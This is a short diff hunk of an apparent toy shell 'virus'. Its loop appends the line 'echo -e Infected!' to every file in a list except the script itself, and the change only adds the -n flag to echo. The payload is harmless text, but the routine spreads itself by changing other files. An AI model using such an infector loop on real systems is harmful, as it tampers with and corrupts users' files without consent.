@@ -18,7 +18,7 @@ filename=$(basename $0)
 
 for file in "${files[@]}"; do
     if [[ $file != $filename ]]; then
-        echo -e "\necho -e Infected!" >> "$file"
+        echo -n -e "\necho -e Infected!" >> "$file"
     fi
 done
 
